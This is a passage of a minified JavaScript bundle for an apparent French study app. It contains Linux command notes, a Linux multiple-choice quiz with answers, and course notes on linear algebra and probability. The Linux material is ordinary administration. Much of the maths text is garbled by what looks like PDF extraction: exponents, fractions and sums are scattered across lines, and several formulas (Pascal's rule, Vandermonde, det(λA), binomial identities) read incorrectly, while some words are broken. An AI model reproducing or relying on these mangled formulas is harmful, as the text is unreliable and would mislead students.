29   unzip archive.zip -d /destination/   # Extraire ailleurs

     ➔ Résumé rapide Compression comparée

      Format       Extension      Ratio      Vitesse

      gzip         .gz            Moyen      Rapide
      bzip2        .bz2           Bon        Moyen
      xz           .xz            Excellent  Lent
      zip          .zip           Moyen      Rapide (multi-plateforme)
      zstd         .zst           Excellent  Très rapide`},{id:"10.1",c:10,t:"Variables d'environnement et profils",x:`➣ Syntaxe / Code Variables et fichiers de configuration

 1   # Variables d'environnement importantes
 2   echo $HOME                   # Répertoire personnel
 3   echo $USER                   # Nom d'utilisateur
 4   echo $PATH                   # Chemins de recherche des commandes
 5   echo $SHELL                  # Shell par défaut
 6   echo $PWD                    # Répertoire courant
 7   echo $HOSTNAME               # Nom de la machine
 8   echo $LANG                   # Langue du système
 9
10   # Modifier le PATH
11   export PATH=$PATH:/opt/mon_app/bin
12
13   # Fichiers de profil (ordre de chargement Bash)
14   # /etc/profile          → Tous les utilisateurs (login shell)
15   # ~/.bash_profile       → Utilisateur courant (login shell)
16   # ~/.bashrc             → Utilisateur courant (chaque terminal)
17   # ~/.bash_logout        → À la déconnexion
18
19   # Alias
20   alias ll='ls -la'            # Créer un alias
21   alias gs='git status'        # Raccourci Git
22   alias rm='rm -i'             # rm avec confirmation
23   unalias ll                   # Supprimer un alias
24
25   # Appliquer les modifications
26   source ~/.bashrc             # Recharger la configuration
27   # ou
28   . ~/.bashrc                  # Idem

     ★ Astuce Concours
     Pour rendre un alias ou une modification de PATH permanent :
      1. L'ajouter dans ~/.bashrc (pour les sessions interactives)
      2. Exécuter source ~/.bashrc pour l'appliquer immédiatement
     Pour TOUS les utilisateurs : modifier /etc/profile ou /etc/environment`},{id:"10.2",c:10,t:"Mémoire et performances système",x:`➣ Syntaxe / Code Surveillance système

 1   # Mémoire
 2   free -h                      # RAM utilisée/disponible
 3   cat /proc/meminfo            # Infos mémoire détaillées
 4   vmstat 1 5                   # Stats mémoire/CPU (5 relevés, 1s)
 5
 6   # CPU
 7   lscpu                        # Informations CPU
 8   cat /proc/cpuinfo            # Détails CPU
 9   uptime                       # Charge système
10   # Load average : 1min, 5min, 15min
11   # Valeur < nb_cores = OK, > nb_cores = surcharge
12
13   # Processus et ressources
14   top                          # Moniteur temps réel
15   htop                         # Version améliorée
16   iotop                        # I/O par processus
17   iftop                        # Trafic réseau par interface
18
19   # Système
20   uname -a                     # Infos système complètes
21   uname -r                     # Version du noyau
22   cat /etc/os-release          # Distribution et version
23   hostname                     # Nom de la machine
24   date                         # Date et heure
25   timedatectl                  # Fuseau horaire et NTP
26
27   # Historique et divers
28   history                      # Historique des commandes
29   history | grep ssh           # Chercher dans l'historique
30   !42                          # Ré-exécuter la commande 42
31   !!                           # Ré-exécuter la dernière commande
32   sudo !!                      # Refaire la dernière commande en sudo
33
34   # Informations matériel
35   lshw                         # Matériel complet
36   lspci                        # Périphériques PCI
37   lsusb                        # Périphériques USB
38   dmesg | tail                 # Messages du noyau

     ◆ Concept clé
     La commande free -h affiche :
      — total : mémoire physique totale
      — used : mémoire utilisée (inclut buffers/cache)
      — free : mémoire vraiment libre
      — available : mémoire disponible pour les applications (free + buffers/cache récupérables)
     C'est 'available' qui est le vrai indicateur de mémoire disponible, pas 'free' !`}],Kf=[{q:"Quelle commande affiche le répertoire de travail courant ?",o:["cd","pwd","ls","dir"],a:1,e:"pwd (Print Working Directory) affiche le chemin absolu du répertoire courant."},{q:"Quelle permission octale correspond à rwxr-xr-x ?",o:["777","755","644","700"],a:1,e:"rwx=7, r-x=5, r-x=5 → 755. Le propriétaire peut tout faire, les autres peuvent lire et exécuter."},{q:"Quelle commande permet de rechercher du texte dans le contenu des fichiers ?",o:["find","locate","grep","which"],a:2,e:"grep recherche un motif (pattern) dans le contenu des fichiers. find cherche des fichiers par critères (nom, taille, date)."},{q:"Que fait la commande chmod 600 fichier.txt ?",o:["Lecture seule pour tous","Lecture+écriture pour le propriétaire uniquement","Exécutable par tous","Aucune permission"],a:1,e:"600 = rw------- → lecture et écriture pour le propriétaire, aucun accès pour le groupe et les autres. Utilisé pour les clés SSH."},{q:"Quel signal est envoyé par Ctrl+C ?",o:["SIGKILL (9)","SIGTERM (15)","SIGINT (2)","SIGHUP (1)"],a:2,e:"Ctrl+C envoie SIGINT (signal d'interruption, numéro 2). SIGKILL (9) ne peut pas être intercepté et tue le processus de force."},{q:"Que signifie le pipe (|) dans la commande : ls | grep txt ?",o:["Exécuter les deux commandes séquentiellement","Rediriger la sortie de ls vers un fichier","Connecter la sortie de ls à l'entrée de grep","Exécuter les deux en parallèle"],a:2,e:"Le pipe (|) connecte la sortie standard (stdout) de la commande à gauche vers l'entrée standard (stdin) de la commande à droite."},{q:"Quel répertoire contient les fichiers de configuration système sous Linux ?",o:["/var","/etc","/usr","/opt"],a:1,e:"/etc contient les fichiers de configuration du système et des services (fstab, passwd, nginx.conf, etc.)."},{q:"Quelle commande ajoute un utilisateur au groupe sudo ?",o:["useradd -G sudo user","usermod -aG sudo user","groupadd sudo user","addgroup user sudo"],a:1,e:"usermod -aG sudo user. Le -a (append) est crucial : sans lui, l'utilisateur est RETIRÉ de tous ses autres groupes !"},{q:"Que fait la commande tar xzf archive.tar.gz ?",o:["Créer une archive compressée","Extraire une archive gzip","Lister le contenu d'une archive","Compresser un dossier"],a:1,e:"x = extraire, z = décompresser gzip, f = fichier. Pour créer : czf (c = create)."},{q:"Quelle expression cron correspond à 'toutes les 5 minutes' ?",o:["5 * * * *","*/5 * * * *","0 5 * * *","* 5 * * *"],a:1,e:"*/5 * * * * signifie 'toutes les 5 minutes'. 5 * * * * signifie 'à la 5ème minute de chaque heure'."},{q:"Quelle commande affiche l'espace disque utilisé en format lisible ?",o:["du -sh","df -h","free -h","lsblk"],a:1,e:"df -h (disk free, human-readable) affiche l'espace utilisé/disponible sur chaque partition. du -sh affiche la taille d'un dossier."},{q:"Comment rediriger stdout ET stderr dans un même fichier ?",o:["commande > fichier 2>&1","commande >> fichier","commande 2> fichier","commande < fichier"],a:0,e:"> redirige stdout vers le fichier, puis 2>&1 redirige stderr (2) vers la même destination que stdout (1)."},{q:"Quelle est la différence entre un lien dur et un lien symbolique ?",o:["Un lien dur ne peut pas traverser les systèmes de fichiers","Un lien dur est plus lent","Un lien symbolique partage le même inode","Il n'y a pas de différence"],a:0,e:"Un lien dur pointe vers le même inode (données physiques) et ne peut pas traverser les FS. Un lien symbolique est un pointeur vers le chemin du fichier."},{q:"Quelle commande permet de voir les ports TCP en écoute ?",o:["ping -l","ss -tlnp","traceroute -p","curl -p"],a:1,e:"ss -tlnp : -t (TCP), -l (listening), -n (numérique), -p (processus). Remplace netstat -tlnp."},{q:"Que contient le fichier /etc/passwd ?",o:["Les mots de passe en clair","Les mots de passe hashés","La liste des utilisateurs et leurs infos","Les logs de connexion"],a:2,e:"/etc/passwd contient la liste des utilisateurs avec UID, GID, home, shell. Les mots de passe hashés sont dans /etc/shadow."},{q:"Quelle commande génère une paire de clés SSH moderne ?",o:["ssh-keygen -t rsa -b 1024","ssh-keygen -t ed25519","ssh-gen --new","openssl genrsa"],a:1,e:"ssh-keygen -t ed25519 est l'algorithme moderne recommandé. RSA reste valide mais avec au moins 4096 bits."},{q:"Que fait 'systemctl enable nginx' ?",o:["Démarre nginx immédiatement","Active nginx au démarrage du système","Recharge la configuration de nginx","Affiche le statut de nginx"],a:1,e:"enable active le service au démarrage (boot). Pour démarrer immédiatement, utiliser start. On peut combiner : systemctl enable --now nginx."},{q:"Comment voir les logs en temps réel d'un service avec systemd ?",o:["tail -f /var/log/nginx.log","journalctl -fu nginx","systemctl log nginx","dmesg nginx"],a:1,e:"journalctl -fu nginx : -f = follow (temps réel), -u = unit (service spécifique). C'est la méthode systemd moderne."},{q:"Que signifie la variable $? en Bash ?",o:["Le PID du shell","Le nombre d'arguments","Le code retour de la dernière commande","Le nom du script"],a:2,e:"$? contient le code de retour de la dernière commande exécutée. 0 = succès, tout autre valeur = erreur."},{q:"Quelle commande permet de trouver des fichiers de plus de 100Mo ?",o:["grep -s 100M /","find / -type f -size +100M","locate --size 100M","ls -R --min-size 100M"],a:1,e:"find / -type f -size +100M : cherche les fichiers (-type f) de taille supérieure à 100 Mo (+100M) dans tout le système (/)."}],j2={id:Xf,name:Qf,color:Wf,sections:$f,quiz:Kf},U2=Object.freeze(Object.defineProperty({__proto__:null,color:Wf,default:j2,id:Xf,name:Qf,quiz:Kf,sections:$f},Symbol.toStringTag,{value:"Module"})),Jf="maths",Yf="Maths & Probas",Zf="#c084fc",eh=[{id:"1.1",c:1,t:"Espaces vectoriels",x:`❖ Définition – Espace vectoriel (EV)

 Un ensemble E est un espace vectoriel sur un corps K (K = R ou C) s'il est muni de :

     une loi interne + : u + v ∈ E ;
     une loi externe · : λ · u ∈ E pour λ ∈ K .
 Ces lois vérifient 8 axiomes :      (E, +) est un groupe commutatif (associativité, commutativité,
 élément neutre ⃗
                0, opposé) et λ(u + v) = λu + λv , (λ + µ)u = λu + µu, λ(µu) = (λµ)u, 1 · u = u.
 Exemples : Rn , Mn,p (R), R[X], Rn [X] (dimension n + 1), l'espace des fonctions F(I, R), les
 suites réelles.

 ❖ Définition – Sous-espace vectoriel (SEV)
 Une partie F ⊂ E est un SEV de E si et seulement si :

    1.   0E ∈ F ;
    2.   ∀(u, v) ∈ F 2 , ∀λ ∈ K,   u + λv ∈ F (stabilité par combinaison linéaire).

 ➤ Exemple

 F = {(x, y, z) ∈ R3 | x + y + z = 0} est un SEV (plan) de R3 : (0, 0, 0) ∈ F et la stabilité est
 immédiate. En revanche G = {(x, y) ∈ R | x + y = 1} n'est pas un SEV car (0, 0) ∈
                                        2                                          / G.

 ✿ Théorème / Propriété – Opérations sur les SEV
 Soient F, G deux SEV de E .

     F ∩ G est toujours un SEV. En général F ∪ G n'en est pas un.
     F + G = {f + g | f ∈ F, g ∈ G} est un SEV, c'est le plus petit SEV contenant F ∪ G.
     Somme directe F ⊕ G : F ∩ G = {0} ; tout vecteur de F + G s'écrit alors de manière
      unique f + g .
     Supplémentaires : E = F ⊕ G ⇐⇒ F ∩ G = {0} et F + G = E .
     Formule de Grassmann : dim(F + G) = dim F + dim G − dim(F ∩ G).`},{id:"1.2",c:1,t:"Familles de vecteurs, bases, dimension",x:`✿ Théorème / Propriété – Familles de vecteurs

 Soit F = (v1 , . . . , vp ) une famille de vecteurs de E .

     Génératrice : E = Vect(v1 , . . . , vp ), tout vecteur est combinaison linéaire des vi .
     Libre : λ1 v1 + · · · + λp vp = 0 =⇒ λ1 = · · · = λp = 0.
     Liée : non libre (un vecteur est combinaison linéaire des autres). Une famille contenant 0E
         ou deux vecteurs proportionnels est liée.
     Base : famille libre et génératrice. Tout vecteur s'exprime de manière unique dans une

                                                     1.3. APPLICATIONS LINÉAIRES

        base (ses   coordonnées   ).

 ✿ Théorème / Propriété – Dimension (en dimension finie n)

 La   dimension dim(E) est le nombre de vecteurs d'une base (tous les bases ont le même cardinal).
       Toute famille libre a au plus n vecteurs ; toute famille génératrice en a au moins n.
       Caractérisation : une famille de exactement n vecteurs est une base ⇐⇒ elle est libre
        ⇐⇒ elle est génératrice.
       Base incomplète : toute famille libre se complète en une base de E .
       Si F est un SEV de E : dim F ≤ dim E , avec égalité ⇐⇒ F = E .
 Dimensions usuelles : dim Rn               =     n, dim Mn,p (R)          =   np, dim Rn [X]   =   n + 1,
 dim{symétriques de Mn } = n(n+1)
                              2   .

 ✎ Méthode – Montrer qu'une famille est libre / base
 Pour n vecteurs de R
                            n : former la matrice A dont les colonnes sont ces vecteurs. La famille est

 une base    ⇐⇒ det(A) ̸= 0 ⇐⇒ rg(A) = n.

 ✿ Théorème / Propriété – Changement de base

 Soit P la   matrice de passage de l'ancienne base B vers la nouvelle B′ (colonnes = coordonnées
                        ′
 des vecteurs de B dans B ). Alors :

                                       X = P X′     et       A′ = P −1 AP
                    ′                                                           ′        ′
 où X (resp. X ) sont les coordonnées d'un vecteur dans B (resp. B ) et A, A les matrices d'un
 même endomorphisme dans ces bases (matrices             semblables   ).`},{id:"1.3",c:1,t:"Applications linéaires",x:`❖ Définition – Application linéaire
 Une application f : E → F est linéaire si :

                              ∀u, v ∈ E, ∀λ ∈ K,     f (u + λv) = f (u) + λf (v)

 En particulier f (0E ) = 0F .

       Si F = E : endomorphisme ; si f est bijective : isomorphisme ; les deux : automor-
        phisme.
       Si F = K : forme linéaire.

 ✿ Théorème / Propriété – Noyau et image

       Noyau : Ker f = {u ∈ E | f (u) = 0F }, SEV de E .
       Image : Im f = {f (u) | u ∈ E}, SEV de F ; si (e1 , . . . , en ) est une base de E : Im f =
        Vect(f (e1 ), . . . , f (en )).
       f injective ⇐⇒ Ker f = {0E } ; f surjective ⇐⇒ Im f = F .

                                                     1.3. APPLICATIONS LINÉAIRES
 ✿ Théorème / Propriété – Théorème du rang (fondamental !)

 Si E est de dimension finie et f ∈ L(E, F ) :

                       dim(E) = dim(Ker f ) + rg(f ),       rg(f ) = dim(Im f ).

 Conséquence : si dim E = dim F = n (ou si f ∈ L(E)), alors
                           f injective ⇐⇒ f surjective ⇐⇒ f bijective.

 ☞ Attention / Piège
                                              espace de départ E , pas celle de F . Et l'équivalence
 Le théorème du rang utilise la dimension de l'
 injective/surjective n'est vraie   qu'en dimensions finies égales.

 ➤ Exemple

 f : R3 → R2 , (x, y, z) 7→ (x + y, y + z). On a Ker f = {(x, y, z) : y = −x, z = x} = Vect(1, −1, 1),
 donc dim Ker f = 1 et rg f = 3 − 1 = 2 : f est surjective (mais pas injective).

 ❖ Définition – Projecteurs et symétries

                  projecteur p sur F parallèlement à G vérifie p2 = p, Im p = F = Ker(p − id),
 Soit E = F ⊕ G. Le
 Ker p = G. La symétrie s par rapport à F parallèlement à G vérifie s2 = id, avec s = 2p − id.
 Leurs valeurs propres possibles sont {0, 1} (projecteur) et {−1, 1} (symétrie) : ils sont toujours
 diagonalisables.

 ✿ Théorème / Propriété – Matrice d'une application linéaire

 Soient B = (e1 , . . . , ep ) base de E et C base de F . La matrice de f est M ∈ Mn,p dont la j -ème
 colonne contient les coordonnées de f (ej ) dans C . Alors rg(f ) = rg(M ) et f (u) a pour coordonnées
 M X . La composition correspond au produit : Mat(g ◦ f ) = Mat(g) Mat(f ).

2. Matrices, Déterminants et Systèmes`},{id:"2.1",c:2,t:"Calcul matriciel",x:`❖ Définition – Opérations sur les matrices
 Soient A, B ∈ Mn,p (K) et C ∈ Mp,q (K).

     Somme : terme à terme. Produit   Ppar un scalaire : (λA)ij = λAij .
     Produit AC ∈ Mn,q : (AC)ij = pk=1 Aik Ckj .
     Transposée : (AT )ij = Aji , avec (AC) T = C T AT .

     Trace (matrice carrée) : Tr(A) = i Aii , linéaire, et Tr(AB) = Tr(BA).
                                        P

 ❖ Définition – Matrices particulières
 Soit A ∈ Mn (R).

     Symétrique : AT = A ; antisymétrique : AT = −A.
     Orthogonale : AT A = In (donc A−1 = AT , det A = ±1, colonnes orthonormées).
     Diagonale, triangulaire (supérieure ou inférieure).
     Idempotente : A2 = A ; nilpotente : Ak = 0 pour un k ; involutive : A2 = I .
     Inversible s'il existe B avec AB = BA = In ; on note B = A−1 .

 ☞ Attention / Piège
 Le produit matriciel n'est   pas commutatif : en général AB ̸= BA. De plus AB = 0 n'implique
 pas A = 0 ou B = 0 (diviseurs de zéro), et (A + B)
                                                     2 ̸= A2 + 2AB + B 2 (sauf si AB = BA). Enfin

 (AB)−1 = B −1 A−1 (ordre inversé).

 ✿ Théorème / Propriété – Binôme de Newton matriciel
                        n =
                              Pn    n
                                      k n−k . Utile avec A = λI + N (N nilpotente) : I commute
 Si AB = BA : (A + B)           k=0 k A B
 avec tout.`},{id:"2.2",c:2,t:"Inverse et rang d'une matrice",x:`✿ Théorème / Propriété – Inversibilité : équivalences

 Pour A ∈ Mn (K), les propriétés suivantes sont équivalentes : A inversible ⇐⇒ det A ̸= 0 ⇐⇒
 rg A = n ⇐⇒ Ker A = {0} ⇐⇒ les colonnes forment une base ⇐⇒ 0 n'est pas valeur propre.

 ✎ Méthode – Calculer A−1
                           −1
                       a b           1       d −b
     Matrice 2 × 2 :           =                      .
                        c d       ad − bc −c a
     Comatrice : A−1 =         Com(A)T où Com(A)ij = (−1)i+j Mij (Mij = mineur).
                          det A
     Pivot de Gauss : transformer (A | I) en (I | A−1 ) par opérations sur les lignes.

 ➤ Exemple

           1 2                                    −1 =    1   4 −2    −2 1
 A=                  , det A = 4 − 6 = −2, donc A                   = 3        .
           3 4                                           −2   −3 1     2 − 12

 ✿ Théorème / Propriété – Rang d'une matrice

 Le   rang est le nombre maximal de colonnes (ou de lignes) linéairement indépendantes, c'est-à-dire
 le nombre de pivots après échelonnement.

       rg(A) = rg(AT ) ≤ min(n, p) pour A ∈ Mn,p .
       rg(AB) ≤ min(rg A, rg B).
       Les opérations élémentaires sur les lignes/colonnes conservent le rang.`},{id:"2.3",c:2,t:"Déterminant",x:`❖ Définition – Déterminant
 Le déterminant d'une matrice carrée A ∈ Mn (K) est un scalaire (à valeur absolue = volume du
 parallélépipède formé par les colonnes).

                    a b
       n = 2 : det                = ad − bc.
                    c d
                                                                               
                                                                         a b c
       n = 3 (Sarrus) : det = aei + bf g + cdh − ceg − bdi − af h pour d e f .
                                                                         g h i
       Développement selon la ligne i : det A = nj=1 (−1)i+j aij Mij (idem par colonne).
                                                   P

 ✿ Théorème / Propriété – Propriétés du déterminant

       det(AB) = det(A) det(B) ; det(AT ) = det(A) ; det(A−1 ) = det(A)
                                                                           .

       det(λA) = λ det(A) (attention au λ !).
                     n                        n

       Échanger deux lignes change le signe ; ajouter à une ligne un multiple d'une autre ne change
        rien ; multiplier une ligne par λ multiplie det par λ.
       Deux lignes (ou colonnes) proportionnelles ⇒ det = 0.
       Matrice triangulaire par blocs : det = produit des déterminants des blocs diagonaux.

 ★ Astuce Concours
 Le déterminant d'une matrice triangulaire ou diagonale est le produit des éléments diago-
 naux. Pour un grand déterminant : échelonner par opérations sur les lignes (sans multiplier),
 puis multiplier la diagonale.`},{id:"2.4",c:2,t:"Systèmes d'équations linéaires",x:`✿ Théorème / Propriété – Structure des solutions de AX = B
 Avec A ∈ Mn,p :

       Rouché-Fontené : il existe une solution ⇐⇒ rg(A) = rg(A|B).
       Si solutions : S = X0 + Ker A (une solution particulière + solutions du système homogène),

                                           2.4. SYSTÈMES D'ÉQUATIONS LINÉAIRES

      avec dim Ker A = p − rg(A)   paramètres libres
                                                .
     Système homogène AX = 0 : toujours la solution 0 ; solutions non nulles ⇐⇒ rg A < p.

 ✿ Théorème / Propriété – Règle de Cramer

 Pour un système carré avec det(A) ̸= 0, la solution est unique :

                                                    det(Ai )
                                             xi =
                                                    det(A)

 où Ai est la matrice A dont la i-ème colonne est remplacée par B .

 ➤ Exemple
 
 x + y + z = 6
 
  2x − y + z = 3     : det A = 7 ̸= 0, det A1 = 7 donc x = 1 ; on trouve de même y = 2, z = 3.
 
  x + 2y − z = 2
 

 ✎ Méthode – Pivot de Gauss
 1) Choisir un pivot non nul dans la 1
                                        re  colonne. 2) Éliminer les termes en dessous par Li ←
 Li − aa11
        i1
           L1 . 3) Répéter sur la sous-matrice. 4) Remonter (substitution). Le nombre de pivots
 donne le rang.

3. Réduction : Valeurs propres, Diagonalisation,
Espaces euclidiens`},{id:"3.1",c:3,t:"Valeurs propres et vecteurs propres",x:`❖ Définition – Éléments propres
 Soit A ∈ Mn (K) (ou f ∈ L(E)).

       λ ∈ K est une valeur propre (VP) s'il existe v ̸= 0 avec Av = λv ; v est un vecteur
         propre (VecP).
       Eλ = Ker(A − λI) est le sous-espace propre ; Sp(A) = ensemble des VP (spectre).
       Multiplicité algébrique mλ = multiplicité de λ comme racine de PA ; multiplicité
        géométrique = dim Eλ .

 ✿ Théorème / Propriété – Polynôme caractéristique

 Les VP de A sont les racines de PA (λ) = det(A − λIn ).

       deg PA = n ; somme des VP (avec multiplicité) = Tr(A) ; produit des VP = det(A).
       1 ≤ dim Eλ ≤ mλ .
       Des vecteurs propres associés à des VP distinctes sont linéairement indépendants.
       Matrice triangulaire : les VP sont les éléments diagonaux.
       Si Av = λv alors Ak v = λk v , P (A)v = P (λ)v , et si A inversible A−1 v = λ−1 v .
       Cayley—Hamilton : PA (A) = 0.

 ★ Astuce Concours – Polynôme caractéristique rapide

 2 × 2 : PA (λ) = λ2 − Tr(A) λ + det(A).
 3 × 3 : PA (λ) = λ3 − Tr(A)λ2 + c2 λ − det(A) où c2 = somme des trois mineurs principaux d'ordre
 2.`},{id:"3.2",c:3,t:"Diagonalisation",x:`❖ Définition – Diagonalisabilité
 A est diagonalisable s'il existe P inversible et D diagonale telles que

                                           A = P DP −1 .

 Les colonnes de P sont des vecteurs propres, les éléments diagonaux de D les VP associées.

 ✿ Théorème / Propriété – Conditions de diagonalisation

      1. Si   A ∈ Mn (K) admet n VP distinctes dans K , alors A est diagonalisable (condition
         susante, non nécessaire).
      2. (CNS) A est diagonalisable
                P                     ⇐⇒ PA est scindé sur K ET dim Eλ = mλ pour toute VP λ
         ⇐⇒       λ dim Eλ = n.

                                PROPRES,
                                     ESPACES
                                          DIAGONALISATION,
                                             EUCLIDIENS ET MATRICES
                                                           ESPACES EUCLIDIENS
                                                                    SYMÉTRIQUES
 ➤ Exemple – Diagonalisation complète

       2 1           2                                                   1

 A=          : PA = λ − 4λ + 3 = (λ − 1)(λ − 3). VP : 1 et 3. E1 = Vect      , E3 = Vect     .
       1 2                                                              −1               1

             1 1
 Donc P =          , D = diag(1, 3) et
            −1 1
                                                                 k
                                                                 3 + 1 3k − 1

                                        k        k   −1     1
                                     A = PD P             =                      .
                                                            2    3k − 1 3k + 1

 ➤ Exemple – Matrice non diagonalisable

       1 1
                                                        0 est de dimension 1 < 2 : non diago-
                              2                         1

 A=           : PA = (λ − 1) , m1 = 2 mais E1 = Vect
       0 1

                  0 −1
 nalisable. B =                                2
                            (rotation) : PB = λ + 1 n'a pas de racine réelle : non diagonalisable
                  1 0
 sur R (mais diagonalisable sur C).

 ★ Astuce Concours – Utilité de la diagonalisation

 Puissances : A
                  k = P D k P −1 (on élève chaque terme diagonal à la puissance k ). Suites récurrentes

                                                                Fn+1        1 1       Fn
 linéaires Un+1 = AUn ⇒ Un = A U0 . Exemple de Fibonacci :
                              n                                         =                  , VP
                                                                 Fn         1 0     Fn−1
        √             √                                  φn − ψ n
 φ = 1+2 5 et ψ = 1−2 5 , d'où la formule de Binet Fn =     √     . Utile aussi pour les chaînes
 de Markov (distribution stationnaire = vecteur propre pour λ = 1) et les systèmes différentiels
 X ′ = AX .`},{id:"3.3",c:3,t:"Espaces euclidiens et matrices symétriques",x:`❖ Définition – Produit scalaire, norme, orthogonalité

                                                      ⟨x, x⟩. Deux vecteurs sont orthogonaux si ⟨x, y⟩ = 0.
          n : ⟨x, y⟩ = xT y =
                                 P                   p
 Dans R                              xi yi , ∥x∥ =
      Cauchy—Schwarz : | ⟨x, y⟩ | ≤ ∥x∥ ∥y∥.
      Inégalité triangulaire : ∥x + y∥ ≤ ∥x∥ + ∥y∥ ; Pythagore : x ⊥ y ⇒ ∥x + y∥2 =
       ∥x∥2 + ∥y∥2 .
                        ⟨x, y⟩
      Angle : cos θ =         .
                       ∥x∥ ∥y∥

 ✎ Méthode – Orthonormalisation de Gram—Schmidt
                                         u1                    P                           vk
 Pour (u1 , u2 , . . . ) libre : e1 =         , puis vk = uk −  j<k ⟨uk , ej ⟩ ej et ek =       .
                                        ∥u1 ∥                                             ∥vk ∥

 ✿ Théorème / Propriété – Projection orthogonale et moindres carrés

                                         ⟨x, u⟩
      Projection de x sur Vect(u) : p(x) =      u.
                                          ∥u∥2
      Projection sur F de base orthonormée (ei ) : pF (x) = i ⟨x, ei ⟩ ei ; c'est le point de F le
                                                            P
       plus proche de x.

                                PROPRES,
                                     ESPACES
                                          DIAGONALISATION,
                                             EUCLIDIENS ET MATRICES
                                                           ESPACES EUCLIDIENS
                                                                    SYMÉTRIQUES

     Moindres carrés : minimiser ∥Ax − b∥2 conduit aux           équations normales AT Ax = AT b,
                  T
      soit x̂ = (A A)
                      −1 AT b si rg A est le nombre de colonnes. C'est le fondement de la régression

       linéaire.

 ✿ Théorème / Propriété – Théorème spectral (cas réel)

 Toute matrice     symétrique réelle (A = AT ) est diagonalisable dans une base orthonormée :
 A = P DP T avec P orthogonale (P −1 = P T ). Ses VP sont réelles et ses sous-espaces propres sont
 deux à deux orthogonaux.

 ❖ Définition – Matrices définies positives

 Une matrice symétrique A est     positive si xT Ax ≥ 0 pour tout x, définie positive si xT Ax > 0
 pour tout x ̸= 0. Caractérisation : toutes les VP ≥ 0 (resp. > 0). Exemples : A
                                                                                    T A est toujours

 positive ; une   matrice de covariance est symétrique positive (base de l'ACP : les axes principaux
 sont ses vecteurs propres, les variances expliquées ses VP).

 ✍ Remarque – SVD

 Toute matrice A ∈ Mn,p (R) s'ècrit A = U ΣV
                                                    T (U, V orthogonales, Σ diagonale positive). Les

 valeurs singulières                                          T
                        sont les racines carrées des VP de A A. La SVD est omniprésente en IA
 (compression, recommandation, ACP).

 ➤ Exemple
              
        2 0 0
                                                       3 4     2
 A = 0 3 4 est symétrique : VP 2 et celles de
                                                           (λ − 12λ + 11 = 0, soit 1 et 11). On
                                                       4 9
        0 4 9
 vérifie Tr = 14 = 2 + 1 + 11 et det = 22 = 2 · 1 · 11.

  partie II
Probabilités

4. Dénombrement et Probabilités de base`},{id:"4.1",c:4,t:"Analyse combinatoire",x:`Tirer p éléments parmi un ensemble de n éléments.

 Type de tirage                     L'ordre compte ?                         Formule
 Tirage avec remise                 OUI (listes, p-uplets)                   np
 Tirage sans remise                                                          Apn = (n−p)!
                                                                                      n!
                                    OUI (arrangements)

 Tirage sans remise
                                                                              n        n!

                                    NON (combinaisons)
                                                                              p = p!(n−p)!
 Permutation (tirer tout)           OUI (p = n)                              n!
                  avec répétition                                             n+p−1

 Combinaisons                       NON
                                                                                p
                                                                                    n!
 Anagrammes avec répétitions        OUI
                                                                             n1 ! n2 ! · · · nk !

  ✿ Théorème / Propriété – Formules sur les coecients binomiaux
                  n         n
       0! = 1,          = 1, n1 = n, np = n−p n

                  0    =    n                         .

       Pascal : p = p + p−1 ; pion : p p = n n−1
                      n n−1     n−1               n

                                                                 .
                                                           p−1
       Newton             n
                                  Pn    n k n−k                         P n
                                                                             = 2n = |P(E)| et

                  : (a + b)   =     k=0 k a b          ; en particulier  k k
                k n
        P
          k (−1) k = 0. P
       Vandermonde : k m
                                 n      m+n

                              k p−k =      p    .

  ➤ Exemple

                       MAMAN : 2! 2!5! 1! = 30. Comité de 2 personnes parmi 6 : 62 = 15. Nombre de

  Anagrammes de
  mots de 4 lettres sur 26 lettres : 26
                                          4 ; sans répétition : A4 .

  ★ Astuce Concours – Quelle formule ?
  Poser 2 questions : (1) l'ordre compte-t-il ? (2) y a-t-il remise/répétition ? Pour un            tirage simultané
  d'un sous-ensemble : combinaison. Pour un        tirage successif    : arrangement (ou liste si remise).`},{id:"4.2",c:4,t:"Axiomes et probabilités conditionnelles",x:`Soit un espace probabilisé (Ω, A, P).

    P(Ω) = 1, P(∅) = 0, 0 ≤ P(A) ≤ 1.
    P(Ac ) = 1 − P(A) ; A ⊂ B ⇒ P(A) ≤ P(B).
    P(A ∪ B) = P(A) + P(B) − P(A ∩ B) ; si A, B Pincompatibles    : P(A ∪ B) = P(A) + P(B).
    Poincaré (3 événements) : P(A ∪ B ∪ C) =
                                                          P
                                                    P(·) − P(· ∩ ·) + P(A ∩ B ∩ C).
                                |A|    cas favorables
    Équiprobabilité : P(A) =       =                 .
                                |Ω|P cas possibles
    Sous-additivité : P( Ai ) ≤
                          S
                                     P(Ai ).

                                4.2. AXIOMES
                                         DE BASE
                                             ET PROBABILITÉS CONDITIONNELLES
 ❖ Définition – Probabilité conditionnelle
 La probabilité de A sachant B (P(B) > 0) est

                                                             P(A ∩ B)
                                               P(A | B) =             .
                                                               P(B)

 Formule des probabilités composées : P(A1 ∩ · · · ∩ An ) = P(A1 )P(A2 |A1 )P(A3 |A1 ∩ A2 ) · · ·

 ✿ Théorème / Propriété – Probabilités totales

 Si (B1 , . . . , Bn ) est un   système complet d'événements (partition de Ω : disjoints, réunion
 = Ω, P(Bi ) > 0) :
                                            n
                                            X                     n
                                                                  X
                                  P(A) =           P(A ∩ Bi ) =         P(A | Bi )P(Bi ).
                                             i=1                  i=1

 ✿ Théorème / Propriété – Formule de Bayes
 Pour "inverser" un conditionnement :

                                             P(A | Bi )P(Bi )   P(A | Bi )P(Bi )
                               P(Bi | A) =                    =P                   .
                                                  P(A)          j P(A | Bj )P(Bj )

 ➤ Exemple – Test de dépistage

 Prévalence P(M ) = 0,01, sensibilité P(+|M ) = 0,99, faux positifs P(+|M̄ ) = 0,05.

                                               0,99 × 0,01          0,0099  1
                       P(M |+) =                                  =        = ≈ 16,7%.
                                        0,99 × 0,01 + 0,05 × 0,99   0,0594  6

 Même avec un bon test, une maladie rare donne surtout des faux positifs ! (Vocabulaire ML :
 c'est la notion de    précision   .)

 ❖ Définition – Indépendance
 A et B sont indépendants ⇐⇒ P(A ∩ B) = P(A)P(B) (ou P(A|B) = P(A)). Si A, B indépen-
 dants, alors A, B̄ le sont aussi. Des événements A1 , . . . , An sont
      T                Q                                                          mutuellement indépendants
 si P(    i∈I Ai ) =       i∈I P(Ai ) pour tout sous-ensemble I (plus fort que "deux à deux").

 ☞ Attention / Piège

 Incompatible ̸= Indépendant ! Si A, B sont incompatibles avec P(A) > 0, P(B) > 0, ils ne sont
 JAMAIS indépendants (car P(A ∩ B) = 0 ̸= P(A)P(B)). Aussi : P(A|B) ̸= P(B|A) en général.

